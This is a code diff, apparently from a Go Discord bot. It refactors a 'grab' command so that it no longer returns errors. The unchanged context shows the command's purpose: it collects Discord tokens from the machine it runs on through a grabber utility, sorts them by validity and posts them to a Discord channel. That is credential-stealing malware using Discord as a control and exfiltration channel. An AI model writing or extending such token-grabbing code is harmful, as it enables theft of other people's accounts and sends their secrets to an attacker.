@@ -17,17 +17,17 @@ const (
 	endStr string = "\x1b[0m\n"
 )
 
-func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) error {
+func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
 	if len(args) == 0 {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, gravArgsError+"\nUsage: "+grabUsage, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, gravArgsError+"\nUsage: "+grabUsage, m.Reference())
+		return
 	}
 
 	if args[0] == "discord" {
 		tokens := utils_grabber.GrabDiscord()
 		if len(tokens) == 0 {
-			_, err := s.ChannelMessageSendReply(m.ChannelID, grabNoTokens, m.Reference())
-			return err
+			s.ChannelMessageSendReply(m.ChannelID, grabNoTokens, m.Reference())
+			return
 		}
 
 		var valid, invalid, httpError []string
@@ -57,11 +57,11 @@ func (*GrabCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args [
 
 		response += "```"
 
-		_, err := s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, response, m.Reference())
+		return
 	} else {
-		_, err := s.ChannelMessageSendReply(m.ChannelID, gravUseError+"\nUsage: "+grabUsage, m.Reference())
-		return err
+		s.ChannelMessageSendReply(m.ChannelID, gravUseError+"\nUsage: "+grabUsage, m.Reference())
+		return
 	}
 }
 
